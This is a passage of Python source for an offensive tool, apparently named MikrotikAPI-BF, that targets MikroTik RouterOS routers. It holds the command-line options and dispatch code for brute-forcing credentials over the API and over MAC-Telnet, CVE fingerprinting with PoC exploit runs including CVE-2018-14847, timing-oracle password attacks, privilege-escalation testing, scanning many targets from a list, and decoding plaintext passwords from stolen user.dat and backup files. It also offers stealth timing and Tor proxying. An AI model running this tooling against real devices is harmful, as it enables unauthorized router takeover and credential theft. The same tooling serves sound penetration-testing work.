    feat.add_argument("--proxy",        metavar="URL",       help="Proxy URL (socks5://127.0.0.1:9050)")
    feat.add_argument("--interactive",   action="store_true", help="Start interactive REPL")
    feat.add_argument("--max-retries",   type=int, default=1, help="Connection retry count (default: 1)")

    # Multi-target (v3.5.0+) — from alina0x fork analysis
    mt = p.add_argument_group(
        "Multi-Target",
        "Scan multiple hosts sequentially from a target file.",
    )
    mt.add_argument(
        "-T", "--target-list",
        metavar="FILE",
        help="File with one target IP/hostname per line. Runs the full attack against each.",
    )

    # Offline credential decoders (v3.5.0+) — based on mikrotik-tools by Kirils Solovjovs
    dec = p.add_argument_group(
        "Offline Decoders (mikrotik-tools integration)",
        "Decode RouterOS proprietary files obtained through exploitation (no network required).",
    )
    dec.add_argument(
        "--decode-userdat",
        metavar="USER.DAT",
        help="Decode a RouterOS user.dat file and print plaintext credentials. "
             "Use together with --decode-useridx for best results. "
             "Obtained via CVE-2018-14847 (user.dat) or .backup extraction.",
    )
    dec.add_argument(
        "--decode-useridx",
        metavar="USER.IDX",
        default=None,
        help="Optional companion user.idx file for --decode-userdat.",
    )
    dec.add_argument(
        "--decode-backup",
        metavar="BACKUP.BACKUP",
        help="Extract and decode credentials from a RouterOS .backup file. "
             "Unencrypted backups only.",
    )
    dec.add_argument(
        "--analyze-npk",
        metavar="PKG.NPK",
        help="Analyze a RouterOS NPK package file (parts, signature, digest, "
             "install script, CVE-2019-3977 indicators).",
    )
    dec.add_argument(
        "--decode-supout",
        metavar="SUPOUT.RIF",
        help="List sections in a RouterOS supout.rif diagnostic file.",
    )
    dec.add_argument(
        "--offline-analyze-dir",
        metavar="DIR",
        help="Analyze downloaded MikroTik artifacts directory (NPK/MIB/Winbox/Netinstall/Flashfig).",
    )

    # NSE installer (v3.6.0+)
    p.add_argument(
        "--install-nse",
        action="store_true",
        help="Copy bundled Nmap NSE scripts to the Nmap scripts directory "
             "(auto-detects on Windows, Linux, macOS). "
             "Also available as: mikrotikapi-install-nse",
    )

    # MAC Server / Layer-2 features (v3.3.0+)
    l2 = p.add_argument_group(
        "MAC Server / Layer-2 (v3.3.0+)",
        "Requires being on the same Layer-2 segment (VLAN/switch) as the target.",
    )
    l2.add_argument(
        "--mac-discover",
        action="store_true",
        help=(
            "Broadcast MNDP discovery on port 20561 to find Mikrotik devices "
            "on the local Layer-2 segment (no IP required)."
        ),
    )
    l2.add_argument(
        "--mac-brute",
        action="store_true",
        help=(
            "Brute-force credentials via MAC-Telnet (TCP port 20561) against all "
            "devices discovered by --mac-discover. Requires -u/-p/-d wordlist args."
        ),
    )
    l2.add_argument(
        "--mac-scan-cve",
        action="store_true",
        help=(
            "Run CVE-2018-14847-MAC exploit against all devices discovered via MNDP. "
            "Probes Winbox credential disclosure on each discovered device."
        ),
    )
    l2.add_argument(
        "--mac-iface-ip",
        metavar="IP",
        default="0.0.0.0",
        help="Local interface IP for MNDP broadcast (default: 0.0.0.0 = all interfaces).",
    )

    # Export
    exp = p.add_argument_group("Export")
    exp.add_argument("--export",     metavar="FORMATS", help="Export formats: json,csv,xml,txt")
    exp.add_argument("--export-all", action="store_true", help="Export to all formats")
    exp.add_argument("--export-dir", default="results",  help="Output directory (default: results)")

    # Session
    sess = p.add_argument_group("Session")
    sess.add_argument("--resume",        action="store_true", help="Resume from previous session")
    sess.add_argument("--force",         action="store_true", help="Force new session")
    sess.add_argument("--list-sessions", action="store_true", help="List saved sessions")
    sess.add_argument("--session-info",  action="store_true", help="Show session info and exit")

    return p


# ── Helpers ────────────────────────────────────────────────────────────────

def _parse_validate(raw: Optional[str]) -> Dict[str, Optional[int]]:
    if not raw:
        return {}
    svcs: Dict[str, Optional[int]] = {}
    for item in raw.split(","):
        item = item.strip()
        if "=" in item:
            name, _, port_s = item.partition("=")
            svcs[name.lower()] = int(port_s) if port_s.isdigit() else None
        else:
            svcs[item.lower()] = None
    return svcs


def _resolve_delay(delay_mode: str, seconds: Optional[float], log: Optional[Log] = None) -> float:
    """Resolve effective delay from preset mode and optional custom value."""
    presets = {
        "high": 0.0,      # Fastest mode to validate server-side rate-limiting.
        "balanced": 0.25,
        "stealth": 1.0,
    }
    mode = delay_mode

    # Backward compatibility: legacy scripts that pass only --seconds.
    if seconds is not None and delay_mode != "custom":
        mode = "custom"
        if log:
            log.warning("[DELAY] --seconds provided. Forcing --delay-mode custom.")

    if mode == "custom":
        if seconds is None:
            raise ValueError("Custom delay mode requires --seconds N.")
        if seconds < 0:
            raise ValueError("Custom delay must be >= 0.")
        return seconds

    return presets.get(mode, 0.0)


def _list_sessions(sm: SessionManager) -> None:
    sessions = sm.list_sessions()
    if not sessions:
        print("\n  No sessions found.\n")
        return
    print(f"\n  {'ID':<14}  {'Target':<16}  {'Status':<11}  {'Progress':>8}  {'Found':>5}  Last Update")
    print("  " + "─" * 70)
    for s in sessions:
        progress = f"{s.get('current_progress', 0):.1f}%"
        found = len(s.get("successful_credentials", []))
        last = (s.get("last_update") or s.get("start_time", ""))[:16]
        print(f"  {s.get('session_id','?'):<14}  {s.get('target','?'):<16}  "
              f"{s.get('status','?'):<11}  {progress:>8}  {found:>5}  {last}")
    print()


# ── CVE Scan standalone function ──────────────────────────────────────────

def _run_cve_scan(
    target: str,
    username: str = "",
    password: str = "",
    show_all: bool = False,
    export_formats: Optional[List[str]] = None,
    export_dir: str = "results",
    http_port: int = 80,
) -> None:
    """Fingerprint target and run applicable CVE PoC checks.

    Args:
        target: Target IP address or hostname.
        username: Optional credential for authenticated checks.
        password: Optional credential for authenticated checks.
        show_all: If True, display all CVEs regardless of version applicability.
        export_formats: List of export formats (json, csv, xml, txt).
        export_dir: Directory for exported reports.
        http_port: HTTP port for WebFig/REST fingerprinting (default 80).
    """
    export_formats = export_formats or []
    try:
        from xpl.cve_db import get_all_cves, get_cves_for_version
        from xpl.exploits import EXPLOIT_REGISTRY
    except ImportError as e:
        print(f"[ERROR] Cannot import xpl module: {e}")
        return

    SEP = "=" * 68
    SEP2 = "-" * 68

    print(f"\n{SEP}")
    print("  SCAN-CVE — RouterOS Vulnerability Assessment")
    print(f"  Target : {target}")
    print(f"  Mode   : {'ALL CVEs (--all-cves)' if show_all else 'version-filtered'}")
    print(SEP)

    # ── Step 1: Fingerprint ──────────────────────────────────────────────────
    detected_version: Optional[str] = None
    board_name = "unknown"
    arch = "unknown"
    open_ports: List[int] = []

    print("\n[1/3] Fingerprinting target...")

    try:
        import requests as _req
        import urllib3 as _u3
        import re as _re
        _u3.disable_warnings()

        # Strategy A: REST API (RouterOS 7.x)
        for scheme in ("http", "https"):
            try:
                r = _req.get(
                    f"{scheme}://{target}:{http_port}/rest/system/resource",
                    auth=(username, password) if username else None,
                    timeout=6, verify=False,
                )
                if r.status_code == 200:
                    info = r.json()
                    detected_version = info.get("version", "").split(" ")[0]
                    board_name = info.get("board-name", "unknown")
                    arch = info.get("architecture-name", "unknown")
                    print(f"  Version : RouterOS {detected_version} (REST API)")
                    print(f"  Board   : {board_name} | Arch: {arch}")
                    break
                elif r.status_code == 401:
                    print("  [INFO] REST API present (HTTP 401) — credentials required")
            except Exception:
                pass

        # Strategy B: WebFig HTML fingerprint (RouterOS 6.x)
        if not detected_version:
            for port_try in set([http_port, 80, 8080]):
                try:
                    r2 = _req.get(
                        f"http://{target}:{port_try}/",
                        timeout=5, verify=False, allow_redirects=True,
                    )
                    html = r2.text
                    # RouterOS version often in the page JS or meta tags
                    ver_m = _re.search(
                        r'(?:RouterOS\s+|routeros-)(\d+\.\d+[\.\d]*)', html, _re.I,
                    )
                    if ver_m:
                        detected_version = ver_m.group(1)
                        print(f"  Version : RouterOS {detected_version} (WebFig HTML)")
                        break
                    # Try Server header
                    srv = r2.headers.get("Server", "")
                    ver_m2 = _re.search(r'(\d+\.\d+[\.\d]*)', srv)
                    if ver_m2:
                        detected_version = ver_m2.group(1)
                        print(f"  Version : RouterOS {detected_version} (HTTP Server header)")
                        break
                    if "RouterOS" in html or "MikroTik" in html:
                        print(f"  [INFO] WebFig confirmed on port {port_try} — RouterOS device")
                except Exception:
                    pass

        # Strategy C: Binary API fingerprint
        if not detected_version:
            try:
                from core.api import Api
                api = Api(target, port=8728, timeout=5)
                if api.login(username, password):
                    info = api.get_system_info()
                    detected_version = (info.get("version") or "").split(" ")[0] or None
                    board_name = info.get("board-name", "unknown")
                    arch = info.get("architecture-name", "unknown")
                    if detected_version:
                        print(f"  Version : RouterOS {detected_version} (binary API)")
            except Exception:
                pass

        # Strategy D: Port scan for open services
        import socket as _sock, concurrent.futures as _cf
        COMMON_PORTS = [21, 22, 23, 80, 443, 888, 8080, 8291, 8728, 8729]

        def _tcp(p: int) -> Optional[int]:
            try:
                s = _sock.socket()
                s.settimeout(1.5)
                if s.connect_ex((target, p)) == 0:
                    s.close()
                    return p
            except Exception:
                pass
            return None

        with _cf.ThreadPoolExecutor(max_workers=12) as _ex:
            open_ports = [p for p in _ex.map(_tcp, COMMON_PORTS) if p]
        print(f"  Open ports: {open_ports}")

    except Exception as fp_err:
        print(f"  [WARN] Fingerprint error: {fp_err}")

    if not detected_version:
        print("  [WARN] Could not detect RouterOS version — showing all CVEs")
        show_all = True

    # ── Step 2: CVE matching ─────────────────────────────────────────────────
    print("\n[2/3] Matching CVE database...")
    all_cves = get_all_cves()
    applicable = get_cves_for_version(detected_version) if detected_version and not show_all else all_cves

    print(f"  Total CVEs in database : {len(all_cves)}")
    print(f"  Applicable to {detected_version or 'N/A':<10}: {len(applicable)}")
    print(f"  With PoC               : {sum(1 for c in applicable if c['poc_available'])}")

    # Print CVE table
    print(f"\n  {'CVE ID':<28} {'SEV':<9} {'CVSS':<6} {'AUTH':<9} {'PoC':<5} STATUS")
    print(f"  {SEP2}")

    for cve in all_cves:
        cid = cve["cve_id"]
        sev = cve["severity"]
        cvss = cve["cvss_score"]
        auth = "auth" if cve["auth_required"] else "pre-auth"
        has_poc = "[PoC]" if cve["poc_available"] else "     "
        is_applicable = cve in applicable
        status = "APPLICABLE" if is_applicable else "patched/n.a."
        print(f"  {has_poc} {cid:<28} {sev:<9} {cvss:<6.1f} {auth:<9} {status}")

    # ── Step 3: Run PoC checks ───────────────────────────────────────────────
    print(f"\n[3/3] Running PoC checks on applicable CVEs...")
    print(SEP2)

    vuln_count = 0
    skip_count = 0
    cve_results: dict = {}

    for cve in applicable:
        cid = cve["cve_id"]
        exploit_cls = EXPLOIT_REGISTRY.get(cid)
        if not exploit_cls:
            cve_results[cid] = "no_poc"
            skip_count += 1
            continue

        requires_auth = cve.get("auth_required", False)
        if requires_auth and not username:
            print(f"  [SKIP] {cid} — requires credentials (use -U / -P)")
            cve_results[cid] = "skipped"
            skip_count += 1
            continue

        print(f"  [RUN]  {cid} — {cve['title'][:50]}")
        try:
            exploit = exploit_cls(
                target=target,
                username=username,
                password=password,
                timeout=10,
            )
            result = exploit.check()
            if result.get("vulnerable"):
                vuln_count += 1
                evidence = result.get("evidence", "")[:100]
                print(f"  [VULN] {cid} VULNERABLE")
                print(f"         {evidence}")
                cve_results[cid] = "vulnerable"
            else:
                err = result.get("error") or result.get("evidence", "not vulnerable")
                print(f"  [SAFE] {cid} — {err[:80]}")
                cve_results[cid] = "safe"
        except Exception as exc:
            print(f"  [ERR]  {cid} — {exc}")
            cve_results[cid] = "error"

    # CVEs not in applicable list get marked as patched/n.a.
    for cve in all_cves:
        if cve["cve_id"] not in cve_results:
            cve_results[cve["cve_id"]] = "patched/n.a."

    # ── Summary ──────────────────────────────────────────────────────────────
    print(f"\n{SEP}")
    print(f"  RESULT SUMMARY — {target}")
    print(SEP)
    print(f"  Version     : RouterOS {detected_version or 'unknown'} | {board_name} | {arch}")
    print(f"  Open ports  : {open_ports}")
    print(f"  CVEs total  : {len(all_cves)}")
    print(f"  Applicable  : {len(applicable)}")
    print(f"  Vulnerable  : {vuln_count}")
    print(f"  Skipped     : {skip_count} (no credentials or no PoC)")
    if vuln_count > 0:
        print(f"\n  [!] {vuln_count} VULNERABILITY/IES CONFIRMED — immediate remediation required")
    else:
        print(f"\n  [+] No exploitable CVEs confirmed for current version")
    print(SEP)

    # ── Credential Matrix (when credentials provided) ────────────────────────
    if username:
        matrix = _credential_matrix(
            target=target,
            username=username,
            password=password,
            http_port=http_port,
            api_port=8728,
            ssl_port=443,
        )

    # ── Export ───────────────────────────────────────────────────────────────
    if export_formats:
        try:
            import os as _os, json as _json
            from datetime import datetime as _dt
            _os.makedirs(export_dir, exist_ok=True)

            # Build scan result record
            scan_data = {
                "scan_date": _dt.utcnow().isoformat() + "Z",
                "target": target,
                "version": detected_version or "unknown",
                "board": board_name,
                "arch": arch,
                "open_ports": open_ports,
                "cve_total": len(all_cves),
                "cve_applicable": len(applicable),
                "cve_vulnerable": vuln_count,
                "cve_skipped": skip_count,
                "results": [
                    {
                        "cve_id": c["cve_id"],
                        "title": c["title"],
                        "severity": c["severity"],
                        "cvss": c["cvss_score"],
                        "auth_required": c["auth_required"],
                        "poc_available": c["poc_available"],
                        "status": cve_results.get(c["cve_id"], "skipped"),
                    }
                    for c in all_cves
                ],
            }

            safe_ip = target.replace(".", "_")
            ts = _dt.utcnow().strftime("%Y%m%d_%H%M%S")
            base = _os.path.join(export_dir, f"scan_cve_{safe_ip}_{ts}")

            for fmt in export_formats:
                if fmt == "json":
                    p = base + ".json"
                    with open(p, "w", encoding="utf-8") as fh:
                        _json.dump(scan_data, fh, indent=2, ensure_ascii=False)
                    print(f"  [EXPORT] JSON  → {p}")
                elif fmt == "txt":
                    p = base + ".txt"
                    with open(p, "w", encoding="utf-8") as fh:
                        fh.write(f"MikrotikAPI-BF CVE Scan Report\n")
                        fh.write(f"Target   : {target}\n")
                        fh.write(f"Date     : {scan_data['scan_date']}\n")
                        fh.write(f"Version  : RouterOS {scan_data['version']}\n")
                        fh.write(f"Ports    : {open_ports}\n")
                        fh.write(f"Vulns    : {vuln_count}/{len(applicable)}\n\n")
                        for r in scan_data["results"]:
                            auth = "pre-auth" if not r["auth_required"] else "auth"
                            fh.write(
                                f"[{r['status'].upper():<9}] {r['cve_id']:<28} "
                                f"{r['severity']:<9} {r['cvss']:<5.1f} {auth}\n"
                            )
                    print(f"  [EXPORT] TXT   → {p}")
                elif fmt == "csv":
                    import csv as _csv
                    p = base + ".csv"
                    with open(p, "w", newline="", encoding="utf-8") as fh:
                        w = _csv.DictWriter(fh, fieldnames=[
                            "cve_id", "title", "severity", "cvss",
                            "auth_required", "poc_available", "status",
                        ])
                        w.writeheader()
                        w.writerows(scan_data["results"])
                    print(f"  [EXPORT] CSV   → {p}")
                elif fmt == "xml":
                    p = base + ".xml"
                    with open(p, "w", encoding="utf-8") as fh:
                        fh.write('<?xml version="1.0" encoding="UTF-8"?>\n')
                        fh.write(f'<scan target="{target}" version="{scan_data["version"]}" '
                                 f'date="{scan_data["scan_date"]}">\n')
                        for r in scan_data["results"]:
                            fh.write(
                                f'  <cve id="{r["cve_id"]}" severity="{r["severity"]}" '
                                f'cvss="{r["cvss"]}" status="{r["status"]}" '
                                f'auth="{r["auth_required"]}" poc="{r["poc_available"]}"/>\n'
                            )
                        fh.write('</scan>\n')
                    print(f"  [EXPORT] XML   → {p}")
        except Exception as exp_err:
            print(f"  [WARN] Export failed: {exp_err}")


# ── Research modes: timing/privesc/cli-timing ─────────────────────────────

def _run_timing_oracle_mode(args: argparse.Namespace) -> int:
    """Execute timing-oracle mode and print JSON result."""
    try:
        from modules.timing_oracle import TimingOracleAttacker
    except Exception as exc:
        print(f"\n  [timing-oracle] Module unavailable: {exc}\n")
        return 1

    mode = "rest" if getattr(args, "timing_rest", False) else "api"
    if getattr(args, "timing_api", False):
        mode = "api"

    attacker = TimingOracleAttacker(
        target=args.target,
        username=getattr(args, "user", "admin"),
        timeout=float(getattr(args, "seconds", 2.0)),
    )
    result = attacker.run(
        samples=max(10, int(getattr(args, "timing_samples", 100))),
        charset_name=getattr(args, "timing_charset", "alphanum"),
        fixed_length=getattr(args, "timing_length", None),
        mode=mode,
        report_csv=getattr(args, "timing_report", None),
    )
    print("\n  [timing-oracle] Result:\n")
    print(json.dumps(result, indent=2, ensure_ascii=False))
    return 0


def _run_privesc_mode(args: argparse.Namespace) -> int:
    """Execute privilege-escalation test matrix and print JSON result."""
    try:
        from modules.privilege_escalation import Account, PrivEscTester
    except Exception as exc:
        print(f"\n  [privesc-test] Module unavailable: {exc}\n")
        return 1

    account_raw = getattr(args, "privesc_accounts", None)
    if account_raw:
        accounts = PrivEscTester.parse_accounts(account_raw, default_password=None)
    else:
        accounts = [Account(username=getattr(args, "user", "admin"), password=getattr(args, "passw", "") or "")]

    tester = PrivEscTester(
        target=args.target,
        timeout=float(getattr(args, "seconds", 5.0)),
        http_port=int(getattr(args, "http_port", 80)),
    )
    result = tester.run(accounts=accounts)
    print("\n  [privesc-test] Result:\n")
    print(json.dumps(result, indent=2, ensure_ascii=False))
    return 0


def _run_cli_timing_mode(args: argparse.Namespace) -> int:
    """Execute CLI timing collection and print JSON result."""
    try:
        from modules.cli_timing_oracle import CLITimingOracle
    except Exception as exc:
        print(f"\n  [cli-timing] Module unavailable: {exc}\n")
        return 1

    oracle = CLITimingOracle(
        target=args.target,
        username=getattr(args, "user", "admin"),
        timeout=float(getattr(args, "seconds", 3.0)),
    )
    result = oracle.run(
        password=getattr(args, "passw", "") or "",
        samples=max(5, int(getattr(args, "timing_samples", 30))),
    )
    print("\n  [cli-timing] Result:\n")
    print(json.dumps(result, indent=2, ensure_ascii=False))
    return 0


# ── Entrypoint ────────────────────────────────────────────────────────────

def main() -> None:
    parser = _build_parser()
    args = parser.parse_args()

    Log.banner(version=_VERSION)

    sm = SessionManager()

    # ── Session management shortcuts ──────────────────────────────────
    if args.list_sessions:
        _list_sessions(sm)
        sys.exit(0)

    if args.session_info and args.target:
        existing = sm.find_existing_session(args.target, ["api"], [])
        if existing:
            stats = sm.get_session_stats(existing["session_id"])
            if stats:
                for k, v in stats.items():
                    print(f"  {k:22}: {v}")
        else:
            print(f"\n  No session found for {args.target}\n")
        sys.exit(0)

    # ── Interactive mode ──────────────────────────────────────────────
    if args.interactive:
        cli = PentestCLI()
        cli.start()
        sys.exit(0)

    # ── NSE install (v3.6.0+) ─────────────────────────────────────
    if getattr(args, "install_nse", False):
        try:
            from mikrotikapi_bf.nse_installer import install_nse
            install_nse(verbose=True)
        except Exception as _nse_exc:
            print(f"\n  [install-nse] Error: {_nse_exc}")
        sys.exit(0)

    # ── Offline decoder modes (v3.5.0+) ──────────────────────────
    _decode_userdat = getattr(args, "decode_userdat", None)
    _decode_useridx = getattr(args, "decode_useridx", None)
    _decode_backup  = getattr(args, "decode_backup",  None)
    _analyze_npk    = getattr(args, "analyze_npk",    None)
    _decode_supout  = getattr(args, "decode_supout",  None)
    _offline_dir    = getattr(args, "offline_analyze_dir", None)

    if _decode_userdat:
        try:
            from modules.decoder import UserDatDecoder
            print(f"\n  [decoder] Decoding user.dat: {_decode_userdat}")
            users = UserDatDecoder.from_files(_decode_userdat, _decode_useridx)
            UserDatDecoder.print_table(users)
        except Exception as _de:
            print(f"\n  [decoder] Error: {_de}\n")
        sys.exit(0)

    if _decode_backup:
        try:
            from modules.decoder import BackupDecoder
            print(f"\n  [decoder] Extracting credentials from backup: {_decode_backup}")
            users = BackupDecoder.extract_credentials(_decode_backup)
            if users:
                from modules.decoder import UserDatDecoder
                UserDatDecoder.print_table(users)
            else:
                print("  No credentials found in backup.\n")
        except Exception as _be:
            print(f"\n  [decoder] Error: {_be}\n")
        sys.exit(0)

    if _analyze_npk:
        try:
            from xpl.npk_decoder import NPKParser, NPKSecurityAnalyzer
            parser = NPKParser(_analyze_npk)
            parser.print_summary()
            result = NPKSecurityAnalyzer.check_cve_2019_3977(_analyze_npk)
            vuln = result.get("vulnerable", False)
            print(f"  CVE-2019-3977 risk: {'HIGH — suspicious NPK characteristics' if vuln else 'Low — no obvious tampering indicators'}")
            print(f"  Evidence: {result.get('evidence', '')}\n")
        except Exception as _ne:
            print(f"\n  [npk] Error: {_ne}\n")
        sys.exit(0)

    if _decode_supout:
        try:
            from modules.decoder import SupoutDecoder
            print(f"\n  [supout] Listing sections in: {_decode_supout}")
            sections = SupoutDecoder.list_sections(_decode_supout)
            if sections:
                print(f"  {'Section name':45}  {'Size':10}  {'Offset'}")
                print("  " + "-" * 70)
                for s in sections:
                    print(f"  {s['name'][:45]:45}  {s['size']:10,}  {s['offset']}")
            else:
                print("  No sections found — may not be a valid supout.rif")
            users = SupoutDecoder.extract_users_from_supout(_decode_supout)
            if users:
                print(f"\n  Users found in supout: {[u['username'] for u in users]}\n")
        except Exception as _se:
            print(f"\n  [supout] Error: {_se}\n")
        sys.exit(0)

    if _offline_dir:
        try:
            from xpl.offline_analyzer import OfflineArtifactAnalyzer
            analyzer = OfflineArtifactAnalyzer()
            result = analyzer.analyze_directory(_offline_dir)
            print(json.dumps(result, indent=2, ensure_ascii=False))
        except Exception as _oe:
            print(f"\n  [offline-analyzer] Error: {_oe}\n")
            sys.exit(1)
        sys.exit(0)

    # ── Delay mode resolution (used by brute-force flows) ──────────────
    _effective_delay: Optional[float] = None
    if getattr(args, "target_list", None) or args.target or getattr(args, "mac_brute", False):
        try:
            _effective_delay = _resolve_delay(
                delay_mode=getattr(args, "delay_mode", "high"),
                seconds=getattr(args, "seconds", None),
            )
        except ValueError as delay_exc:
            parser.error(str(delay_exc))

    # ── MAC Server / Layer-2 modes (v3.3.0+) ─────────────────────────
    mac_discover = getattr(args, "mac_discover", False)
    mac_brute    = getattr(args, "mac_brute",    False)
    mac_scan_cve = getattr(args, "mac_scan_cve", False)
    mac_iface_ip = getattr(args, "mac_iface_ip", "0.0.0.0")

    if mac_discover or mac_brute or mac_scan_cve:
        try:
            from modules.mac_server import MNDPDiscovery, MACServerBrute
        except ImportError as _e:
            print(f"\n  [ERROR] MAC-Server module not available: {_e}\n")
            sys.exit(1)

        print(
            f"\n  [MAC-SERVER] Layer-2 mode active — iface: {mac_iface_ip}\n"
            "  NOTE: Only devices on the same broadcast domain will be discovered.\n"
        )

        _disc = MNDPDiscovery(timeout=3.0, iface_ip=mac_iface_ip)
        _devices = _disc.discover()
        _disc.print_table(_devices)

        if mac_brute and _devices:
            _usernames = args.userlist if args.userlist else args.user
            _passwords = args.passlist if args.passlist else args.passw
            _combo     = args.dictionary if args.dictionary else None

            # Build flat wordlist
            _wl: List[Tuple[str, str]] = []
            if _combo:
                try:
                    from modules.wordlists import WordlistManager
                    _wl = WordlistManager.load_combo(_combo)
                except Exception:
                    with open(_combo) as _f:
                        for _ln in _f:
                            if ":" in _ln:
                                _u, _p = _ln.strip().split(":", 1)
                                _wl.append((_u, _p))
            elif _usernames and _passwords:
                _u_list = [_usernames] if isinstance(_usernames, str) else open(_usernames).read().splitlines()
                _p_list = [_passwords] if isinstance(_passwords, str) else open(_passwords).read().splitlines()
                _wl = [(_u, _p) for _u in _u_list for _p in _p_list]
            else:
                _wl = [("admin", ""), ("admin", "admin"), ("admin", "mikrotik")]

            print(f"\n  [MAC-BRUTE] Testing {len(_wl)} combination(s) via MAC-Telnet…\n")
            _mac_delay = _effective_delay if _effective_delay is not None else 0.0
            _brute = MACServerBrute(wordlist=_wl, delay=_mac_delay)
            _mac_results = _brute.run(devices=_devices)

            if _mac_results:
                print(f"\n  [MAC-BRUTE] *** {len(_mac_results)} credential(s) found ***")
                for _r in _mac_results:
                    print(f"    MAC={_r['mac']}  IP={_r['ip']}  {_r['username']} / {_r['password']}")
            else:
                print("\n  [MAC-BRUTE] No credentials found.\n")

        if mac_scan_cve:
            print("\n  [MAC-CVE] Running CVE-2018-14847 against discovered devices…\n")
            try:
                from xpl.exploits import Exploit_CVE_2018_14847_MAC
                _mac_xpl = Exploit_CVE_2018_14847_MAC(
                    target=args.target or "0.0.0.0", timeout=10
                )
                _mac_xpl_result = _mac_xpl.check()
                vuln = _mac_xpl_result.get("vulnerable", False)
                print(f"  CVE-2018-14847-MAC: {'VULNERABLE' if vuln else 'Not exploitable'}")
                print(f"  Evidence: {_mac_xpl_result.get('evidence','')}\n")
                discovered = _mac_xpl_result.get("mac_discovery", [])
                if discovered:
                    print(f"  Devices found by MNDP: {discovered}\n")
            except Exception as _xe:
                print(f"  [MAC-CVE] Error: {_xe}\n")

        if not mac_brute and not mac_scan_cve:
            sys.exit(0)

        if not args.target:
            sys.exit(0)

    # ── CVE Scan mode (standalone — no BF needed) ─────────────────────
    if getattr(args, "scan_cve", False) and args.target:
        _exp_fmts: List[str] = []
        if getattr(args, "export_all", False):
            _exp_fmts = ["json", "csv", "xml", "txt"]
        elif getattr(args, "export", None):
            _exp_fmts = [f.strip().lower() for f in args.export.split(",")]
        _run_cve_scan(
            target=args.target,
            username=getattr(args, "user", ""),
            password=getattr(args, "passw", ""),
            show_all=getattr(args, "all_cves", False),
            export_formats=_exp_fmts,
            export_dir=getattr(args, "export_dir", "results"),
            http_port=getattr(args, "http_port", 80) or 80,
        )
        sys.exit(0)

    # ── Run specific exploit by ID (v3.9.0+) ────────────────────────
    _run_exploit_id = getattr(args, "run_exploit", None)
    if _run_exploit_id and args.target:
        try:
            from xpl.exploits import EXPLOIT_REGISTRY
            exploit_cls = EXPLOIT_REGISTRY.get(_run_exploit_id)
            if not exploit_cls:
                print(f"\n  [ERROR] Exploit '{_run_exploit_id}' not found in registry.")
                print(f"  Available: {', '.join(sorted(EXPLOIT_REGISTRY.keys())[:10])}...")
                sys.exit(1)
            print(f"\n  [EXPLOIT] Running {_run_exploit_id} against {args.target}…")
            exploit = exploit_cls(
                target=args.target,
                timeout=10,
                username=getattr(args, "user", ""),
                password=getattr(args, "passw", ""),
            )
            result = exploit.check()
            vuln = result.get("vulnerable", False)
            print(f"  CVE:        {_run_exploit_id}")
            print(f"  Vulnerable: {'YES' if vuln else 'NO'}")
            print(f"  Evidence:   {result.get('evidence', 'N/A')[:200]}")
            if result.get("error"):
                print(f"  Error:      {result['error']}")

            _exp_fmts_xpl: List[str] = []
            if getattr(args, "export_all", False):
                _exp_fmts_xpl = ["json", "csv", "xml", "txt", "sarif"]
            elif getattr(args, "export", None):
                _exp_fmts_xpl = [f.strip().lower() for f in args.export.split(",")]
            if _exp_fmts_xpl:
                _exp_dir = getattr(args, "export_dir", "results")
                exporter = ResultExporter(
                    [result], args.target, output_dir=_exp_dir,
                )
                for fmt in _exp_fmts_xpl:
                    method = getattr(exporter, f"export_{fmt}", None)
                    if method:
                        path = method()
                        print(f"  Exported:   {path}")
            print()
        except Exception as exc:
            print(f"\n  [ERROR] Exploit execution failed: {exc}\n")
            if getattr(args, "verbose_all", False):
                import traceback
                traceback.print_exc()
        sys.exit(0)

    # ── Full audit mode (v3.9.0+) ─────────────────────────────────────
    if getattr(args, "audit", False) and args.target:
        try:
            from xpl.auditor import MikroTikAuditor
            auditor = MikroTikAuditor(
                host=args.target,
                user=getattr(args, "user", "") or "admin",
                password=getattr(args, "passw", "") or "",
                timeout=10,
            )
            results = auditor.run_full_audit()
            report_dir = Path(getattr(args, "audit_report", "results"))
            report_path = auditor.generate_report(results, report_dir)
            print(f"\n  [AUDIT] Report: {report_path}")

            _exp_fmts_audit: List[str] = []
            if getattr(args, "export_all", False):
                _exp_fmts_audit = ["json", "sarif"]
            elif getattr(args, "export", None):
                _exp_fmts_audit = [f.strip().lower() for f in args.export.split(",")]
            if _exp_fmts_audit:
                exporter = ResultExporter(
                    auditor.findings, args.target,
                    output_dir=str(report_dir),
                )
                for fmt in _exp_fmts_audit:
                    method = getattr(exporter, f"export_{fmt}", None)
                    if method:
                        path = method()
                        print(f"  [AUDIT] Exported: {path}")
        except Exception as exc:
            print(f"\n  [ERROR] Audit failed: {exc}\n")
            if getattr(args, "verbose_all", False):
                import traceback
                traceback.print_exc()
        sys.exit(0)

    # ── Timing oracle / PrivEsc / CLI timing standalone modes ───────────
    if getattr(args, "timing_oracle", False):
        if not args.target:
            parser.error("Target (-t) is required for --timing-oracle")
        sys.exit(_run_timing_oracle_mode(args))

    if getattr(args, "privesc_test", False):
        if not args.target:
            parser.error("Target (-t) is required for --privesc-test")
        sys.exit(_run_privesc_mode(args))

    if getattr(args, "cli_timing", False):
        if not args.target:
            parser.error("Target (-t) is required for --cli-timing")
        sys.exit(_run_cli_timing_mode(args))

    # ── Multi-target mode (v3.5.0+) ────────────────────────────────
    _target_list_file = getattr(args, "target_list", None)
    if _target_list_file:
        try:
            with open(_target_list_file) as _tf:
                targets_from_file = [l.strip() for l in _tf if l.strip() and not l.startswith("#")]
        except OSError as _tfe:
            print(f"\n  [multi-target] Cannot read target list: {_tfe}\n")
            sys.exit(1)

        print(f"\n  [multi-target] Loaded {len(targets_from_file)} target(s) from {_target_list_file}")
        _all_mt_results: List[Dict] = []

        for _tgt in targets_from_file:
            print(f"\n{'='*60}\n  Target: {_tgt}\n{'='*60}")
            _log_mt = Log(verbose=args.verbose, verbose_all=args.verbose_all)
            _svc = _scan_services(_tgt, args.api_port, args.http_port, args.ssl_port, args.ssl)
            if not any(_svc.values()):
                _log_mt.warning("[!] %s — no open Mikrotik ports, skipping.", _tgt)
                continue
            _eng = BruteforceEngine(
                target=_tgt,
                usernames=args.userlist if args.userlist else args.user,
                passwords=args.passlist if args.passlist else args.passw,
                combo_dict=args.dictionary,
                delay=_effective_delay if _effective_delay is not None else 0.0,
                api_port=args.api_port,
                rest_port=args.rest_port,
                http_port=args.http_port,
                ssl_port=args.ssl_port,
                use_ssl=args.ssl,
                max_workers=args.threads,
                verbose=args.verbose,
                verbose_all=args.verbose_all,
                validate_services=_parse_validate(args.validate),
                services_ok=_svc,
                show_progress=args.progress,
                proxy_url=args.proxy,
                export_formats=[],
                export_dir=args.export_dir,
                max_retries=args.max_retries,
